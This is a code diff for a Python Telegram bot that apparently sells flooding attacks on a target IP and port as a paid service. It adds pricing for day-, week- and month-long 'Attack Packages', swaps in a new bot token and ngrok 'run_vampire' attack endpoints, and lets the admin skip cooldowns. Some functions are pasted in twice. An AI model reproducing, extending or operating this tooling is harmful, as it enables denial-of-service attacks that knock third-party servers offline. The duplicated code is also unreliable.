@@ -23,13 +23,13 @@ async def get_settings():
     return 10, 9  # Default values if not set
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7881686110:AAEumtUEjMQ-Po5dp4jIby_2IU7q3upQZtA'
+TELEGRAM_BOT_TOKEN = '7875730149:AAFWYpDHmFaFbJO3eAmsAIbGCEUj0t8qSok'
 ADMIN_USER_ID = 529691217  # Replace with your admin user ID
 # Replace this with your actual list of URLs
 attack_urls = [
-    "https://aebd-2a05-d016-73c-dd00-c99d-92e3-4f2-d36.ngrok-free.app/run_vampire",
-    "https://82a1-2406-da1a-1f0-4500-c2fa-6a00-cfd7-f3cc.ngrok-free.app/run_vampire",
-    "https://a750-2a05-d016-73c-dd00-9719-2e9b-b693-d09b.ngrok-free.app/run_vampire",
+    "https://f819-2406-da1a-1f0-4500-c2fa-6a00-cfd7-f3cc.ngrok-free.app/run_vampire",
+    "https://2e45-2a05-d016-73c-dd00-9719-2e9b-b693-d09b.ngrok-free.app/run_vampire",
+    "https://1741-2a05-d016-73c-dd00-c99d-92e3-4f2-d36.ngrok-free.app/run_vampire",
 ]
 # Track user attacks and cooldowns
 cooldown_dict = {}
@@ -38,21 +38,145 @@ user_attack_history = {}
 # Valid IP prefixes
 valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '0.', '235.')
 
+async def price(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    
+    # Define the pricing message
+    pricing_message = (
+        "*💰 Here are the bot service pricing details:*\n\n"
+        "*1. Basic Attack Package:* 1 Day 120\n"
+        "*2. Advanced Attack Package:* 7 Day 500\n"
+        "*3. Premium Attack Package:* 30 Day 1k \n\n"
+        "*For further details or to make a purchase, contact @demon_rocky.*"
+    )
+
+    # Send the pricing message
+    try:
+        await context.bot.send_message(chat_id=chat_id, text=pricing_message, parse_mode='Markdown')
+    except Exception as e:
+        print(f"Error sending message: {e}")
+
+# Function to check if user is allowed (for demonstration purposes)
+async def is_user_allowed(user_id):
+    # This function should check if the user is in the allowed list
+    # For now, returning True for demonstration
+    return True
+
+# Define the start function
+async def price(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    
+    # Define the pricing message
+    pricing_message = (
+        "*💰 Here are the bot service pricing details:*\n\n"
+        "*1. Basic Attack Package:* 1 Day 120\n"
+        "*2. Advanced Attack Package:* 7 Day 500\n"
+        "*3. Premium Attack Package:* 30 Day 1k \n\n"
+        "*For further details or to make a purchase, contact @demon_rocky.*"
+    )
+
+    # Send the pricing message
+    try:
+        await context.bot.send_message(chat_id=chat_id, text=pricing_message, parse_mode='Markdown')
+    except Exception as e:
+        print(f"Error sending message: {e}")
+
+# Function to check if user is allowed (for demonstration purposes)
+async def is_user_allowed(user_id):
+    # This function should check if the user is in the allowed list
+    # For now, returning True for demonstration
+    return True
+
+# Define the start function
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id  # Get the ID of the user
+    username = update.effective_user.username  # Get the username of the user
 
-    # Check if the user is allowed to use the bot
-    if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ ❌ 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩! 𝘽𝙪𝙮 𝙩𝙝𝙚 𝙠𝙚𝙮𝙨 𝙛𝙧𝙤𝙢 @Demon_Rocky*", parse_mode='Markdown')
-        return
+    # Check if the user is the admin
+    if user_id == ADMIN_USER_ID:
+        # Admin is always approved
+        status = "*🟢 Status: ✅ Approved*"
+        message = (
+            f"*⚡ Welcome to the battlefield, @{username}! ⚡*\n\n"
+            f"Your User ID is: `{user_id}`\n\n"  # Monospace for User ID
+            f"{status}\n"
+            "*🎉 Welcome aboard, agent!*\n\n"
+            "*💰 Pricing for the bot services /price*\n"
+            "*💻 Prepare to launch your attack, agent.*\n"
+            "*💀 Hack the system. Break the barriers.*\n\n"
+            "*🛠️ To see available commands, use /help*"
+        )
+    else:
+        # Check if the user is allowed (not admin)
+        if await is_user_allowed(user_id):
+            # User is approved
+            status = "*🟢 Status: ✅ Approved*"
+            message = (
+                f"*⚡ Welcome to the battlefield, @{username}! ⚡*\n\n"
+                f"Your User ID is: `{user_id}`\n\n"  # Monospace for User ID
+                f"{status}\n"
+                "*🎉 Welcome aboard, agent!*\n\n"
+                "*💰 Pricing for the bot services /price*\n"
+                "*💻 Prepare to launch your attack, agent.*\n"
+                "*💀 Hack the system. Break the barriers.*\n\n"
+                "*🛠️ To see available commands, use /help*"
+            )
+        else:
+            # User is not approved
+            status = "*🔴 Status: ❌ Not Approved*"
+            message = (
+                f"*⚡ Welcome to the battlefield, @{username}! ⚡*\n\n"
+                f"Your User ID is: `{user_id}`\n\n"  # Monospace for User ID
+                f"{status}\n"
+                "*🚫 Access Restricted! Contact admin for support.*\n\n"
+                "*💰 Pricing for the bot services DM @demon_rocky*\n\n"
+                "*🛠️ To see available commands, use /help*"
+            )
 
-    message = (
-          "*🚀ıllıllı ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ  ÐɐƦʞωǝß ßÖ† ıllıllı 🚀*\n\n"
-        "*💀Use /attack <ip> <port> <duration>*\n"
-        "*🖥️ ꜱᴇʀᴠᴇʀ ꜰʀᴇᴇᴢ ᴡɪᴛʜ @DEMON_ROCKY 🚀*" 
-    )
-    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+    # Send the appropriate message to the user
+    try:
+        await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+    except Exception as e:
+        print(f"Error sending message: {e}")
+
+
+# Define the help function
+async def help(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id  # Get the ID of the user
+    username = update.effective_user.username  # Get the username of the user
+
+    # If the user is admin, show all commands
+    if user_id == ADMIN_USER_ID:
+        message = (
+            "*🛠️ Available Commands for Admins:*\n"
+            "/attack - Attack system\n"
+            "/add - Add user\n"
+            "/remove - Remove user\n"
+            "/gen - Generate data\n"
+            "/redeem - Redeem code\n"
+            "/delete\\_code - Delete code\n"  # Correct escaping of underscore
+            "/list\\_codes - List codes\n"   # Correct escaping of underscore
+            "/users - List all users\n"
+            "/thread - Manage threads\n"
+            "/byte - Perform byte operations\n"
+            "/show - Show settings"
+        )
+    else:
+        # If the user is not admin, show limited commands
+        message = (
+            "*🛠️ Available Commands for Users:*\n"
+            "/attack - Attack system\n"
+            "/redeem - Redeem code"
+        )
+
+    # Send the help message
+    try:
+        await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+    except Exception as e:
+        print(f"Error sending message: {e}")
+
 
 async def add_user(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
@@ -125,9 +249,13 @@ async def attack(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
 
     # Check if the user is allowed to use the bot
-    if not await is_user_allowed(user_id) and user_id != ADMIN_USER_ID:
+    if not await is_user_allowed(user_id):
         await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
         return
+
+    # Admins are not affected by cooldown
+    if user_id == ADMIN_USER_ID:
+        cooldown_dict.pop(user_id, None)
 
     # Get the attack parameters
     args = context.args
@@ -140,9 +268,8 @@ async def attack(update: Update, context: CallbackContext):
     # Get the settings from the database (threads and byte size)
     threads, byte_size = await get_settings()
 
-    # Check for cooldown
-    if user_id != ADMIN_USER_ID:
-    if user_id in cooldown_dict and datetime.now(timezone.utc) < cooldown_dict[user_id]:
+    # Check for cooldown for non-admins
+    if user_id not in [ADMIN_USER_ID] and user_id in cooldown_dict and datetime.now(timezone.utc) < cooldown_dict[user_id]:
         remaining_time = (cooldown_dict[user_id] - datetime.now(timezone.utc)).total_seconds()
         await context.bot.send_message(chat_id=chat_id, text=f"*❌ You need to wait {int(remaining_time)} seconds before attacking again.*", parse_mode='Markdown')
         return
@@ -169,21 +296,21 @@ async def attack(update: Update, context: CallbackContext):
     # Perform the attack logic
     await context.bot.send_message(
         chat_id=chat_id,
-        text=(
-            f"*🚀 ÐɐƦʞωǝß ℓαυη¢ђє∂! ⚔️\n"
-            f"*☄️ 丅ɐƦĞə𝚝: {ip}:{port}*\n"
-            f"*🕒 🧵 𐌀丅丅ɐcʞ ∂υяαтιση: 260 seconds*\n"
-            f"*🔥•------» 𐌀ттα¢к ιη ρяσ¢єѕѕ «------•💥*"
+        text=( 
+            f"*⚔️ ÐȺƦʞᏔǝß 𐌀丅丅ɐcʞ ℓαυη¢ђє∂! ⚔️*\n"
+            f"*🎯 ㄒαʀᎶǝㄒ: {ip}:{port}*\n"
+            f"*🕒 Duration: 260 seconds*\n"
+            f"*🔥•------» 𝙻𝚎𝚝 𝚑𝚎 𝚋𝚊𝚝𝚝𝚕𝚎𝚏𝚒𝚎𝚕𝚍 𝚒𝚐𝚗𝚢𝚝𝚎! «------•💥*"
         ),
         parse_mode='Markdown'
     )
 
-# Record the attack time for the IP and port combination
-    if user_id != ADMIN_USER_ID:
+    # Record the attack time for the IP and port combination
     user_attack_history[attack_key] = datetime.now(timezone.utc)
 
-    # Set a cooldown for the user (60 seconds)
-    cooldown_dict[user_id] = datetime.now(timezone.utc) + timedelta(seconds=300)
+    # Set a cooldown for the user (60 seconds) for non-admins
+    if user_id != ADMIN_USER_ID:
+        cooldown_dict[user_id] = datetime.now(timezone.utc) + timedelta(seconds=300)
 
     # Run the attack logic in the background with the fetched settings
     asyncio.create_task(perform_attack(ip, port, chat_id, context, threads, byte_size))
@@ -217,7 +344,6 @@ async def perform_attack(ip, port, chat_id, context, threads, byte_size):
             break  # Stop the loop on error
 
     await context.bot.send_message(chat_id=chat_id, text="✅ Attack process finished!", parse_mode='Markdown')
-
 
 # Function to generate a redeem code with a specified redemption limit and optional custom code name
 async def generate_redeem_code(update: Update, context: CallbackContext):
@@ -571,6 +697,7 @@ def main():
     application.add_handler(CommandHandler('thread', set_thread))
     application.add_handler(CommandHandler('byte', set_byte))
     application.add_handler(CommandHandler('show', show_settings))
+    application.add_handler(CommandHandler("help", help))
     
     application.run_polling()
 
